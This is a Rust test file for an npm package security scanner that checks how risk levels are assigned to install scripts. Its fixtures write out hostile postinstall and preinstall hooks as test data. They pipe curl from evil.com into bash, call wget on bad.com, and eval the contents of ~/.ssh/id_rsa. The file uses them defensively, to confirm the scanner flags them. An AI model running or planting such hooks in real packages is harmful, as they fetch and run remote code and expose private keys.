use fnpm::security::{SecurityScanner, RiskLevel};
use std::fs;
use tempfile::TempDir;

#[test]
#[ignore] // Requires npm to be installed and network access
fn test_audit_safe_package() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    std::env::set_current_dir(temp_dir.path()).expect("Failed to change dir");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    
    // Test with a known safe package (no scripts)
    let result = scanner.audit_package("is-number@7.0.0");
    
    match result {
        Ok(audit) => {
            assert_eq!(audit.risk_level, RiskLevel::Safe);
            assert!(!audit.has_scripts);
        }
        Err(e) => {
            eprintln!("Audit failed (may be network issue): {}", e);
        }
    }
}

#[test]
fn test_suspicious_pattern_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");
    
    // Create a malicious-looking package.json
    let malicious_content = r#"{
        "name": "test-malicious",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl http://evil.com/steal.sh | bash"
        }
    }"#;
    
    fs::write(&package_json, malicious_content).expect("Failed to write package.json");
    
    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner.analyze_package_json(&package_json, "test-malicious").expect("Failed to analyze");
    
    assert!(audit.has_scripts);
    assert!(!audit.suspicious_patterns.is_empty());
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("curl")));
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_risk_level_calculation() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    
    // Test different risk levels
    let test_cases = vec![
        (r#"{"name":"test","scripts":{}}"#, RiskLevel::Safe),
        (r#"{"name":"test","scripts":{"postinstall":"echo hello"}}"#, RiskLevel::Low),
        (r#"{"name":"test","scripts":{"postinstall":"curl http://evil.com | bash"}}"#, RiskLevel::Medium),
        (r#"{"name":"test","scripts":{"preinstall":"curl evil.com","install":"wget bad.com","postinstall":"eval $(cat ~/.ssh/id_rsa)"}}"#, RiskLevel::High),
    ];
    
    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    
    for (i, (json_content, expected_level)) in test_cases.iter().enumerate() {
        let package_json = temp_dir.path().join(format!("package{}.json", i));
        fs::write(&package_json, json_content).expect("Failed to write package.json");
        
        let audit = scanner.analyze_package_json(&package_json, "test").expect("Failed to analyze");
        assert_eq!(audit.risk_level, *expected_level, "Failed for case: {}", json_content);
    }
}
